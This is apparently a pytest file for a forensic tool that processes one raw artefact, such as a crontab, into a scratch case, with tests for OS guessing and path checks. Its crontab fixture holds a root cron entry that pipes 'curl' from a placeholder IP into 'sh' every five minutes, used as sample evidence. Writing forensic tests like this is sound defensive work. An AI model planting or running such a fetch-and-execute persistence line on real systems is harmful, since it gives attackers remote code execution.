"""process_one.py (rowanholt elrond process-one): one raw file through Elrond's dispatcher into a scratch case."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

import process_one  # noqa: E402


def test_platform_from_where_the_file_sits() -> None:
    assert process_one.guess_os("crontab") == "Linux"
    assert process_one.guess_os("linux/var+log+wtmp") == "Linux"
    assert process_one.guess_os("tcc/TCC.db") == "macOS"
    assert process_one.guess_os("tasks/LabSync") == "Windows"


def test_cooks_one_file_without_touching_the_case(tmp_path, monkeypatch, capsys) -> None:
    raw = tmp_path / "CASE" / "lab-ubuntu" / "artefacts" / "raw"
    raw.mkdir(parents=True)
    crontab = raw / "crontab"
    crontab.write_text("17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
                       "*/5 * * * * root curl -s http://198.51.100.7/x.sh | sh\n")
    before = sorted(p.name for p in (tmp_path / "CASE").rglob("*"))
    monkeypatch.setattr(sys, "argv", ["process_one.py", str(crontab)])
    assert process_one.main() == 0
    out = capsys.readouterr().out
    assert "== cron.jsonl" in out and "2 rows" in out
    assert sorted(p.name for p in (tmp_path / "CASE").rglob("*")) == before


def test_refuses_a_file_outside_raw(tmp_path, monkeypatch, capsys) -> None:
    stray = tmp_path / "crontab"
    stray.write_text("")
    monkeypatch.setattr(sys, "argv", ["process_one.py", str(stray)])
    assert process_one.main() == 2
    assert "Not a file under" in capsys.readouterr().out
